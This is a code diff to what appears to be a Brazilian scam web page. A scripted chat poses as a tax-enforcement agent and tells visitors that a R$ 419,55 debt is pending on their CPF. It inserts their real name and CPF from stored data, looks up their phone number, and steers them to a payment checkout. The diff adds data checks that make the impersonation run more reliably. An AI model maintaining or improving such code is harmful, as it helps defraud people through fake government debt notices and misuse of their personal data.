@@ -322,6 +322,9 @@ const CHECKOUT_URL = 'https://payment.pag.giving/?hash=91153ba17e1697157a4d7bbc7
 <script>
 // Get customer data from localStorage (saved when accessing via CPF slug)
 const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
+if (!customerData || !customerData.nome || !customerData.cpf) {
+    console.warn('customerData ausente ou incompleto no chat.');
+}
 
 // Function to properly capitalize names
 function capitalizeNames(name) {
@@ -873,6 +876,9 @@ async function buscarTelefonePorCPF() {
     try {
         // Obter CPF do localStorage
         const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
+if (!customerData || !customerData.nome || !customerData.cpf) {
+    console.warn('customerData ausente ou incompleto no chat.');
+}
         const cpf = customerData.cpf;
         
         if (!cpf) {
@@ -1268,9 +1274,10 @@ function formatarTelefone(telefone) {
 }
 
 function iniciarChat(customerData) {
-    const firstName = customerData.nome ? capitalizeNames(customerData.nome.split(' ')[0]) : 'Contribuinte';
-    const fullName = customerData.nome ? capitalizeNames(customerData.nome) : 'Contribuinte';
-    const cpf = formatarCPF(customerData.cpf) || 'CPF não informado';
+    const hasRealDataLocal = !!(customerData && customerData.nome && customerData.cpf);
+    const firstName = hasRealDataLocal ? capitalizeNames(customerData.nome.split(' ')[0]) : 'Contribuinte';
+    const fullName = hasRealDataLocal ? capitalizeNames(customerData.nome) : 'Contribuinte';
+    const cpf = hasRealDataLocal ? formatarCPF(customerData.cpf) : 'CPF não informado';
 
     const chatSequence = [
         {
@@ -1278,7 +1285,7 @@ function iniciarChat(customerData) {
             delay: 8000
         },
         {
-            message: hasRealData 
+            message: hasRealDataLocal 
                 ? `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente de R$ 419,55 no seu CPF ${cpf}, registrado em nome de ${fullName}.`
                 : `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente de R$ 419,55 no seu CPF, registrado em seu nome.`,
             delay: 15000,
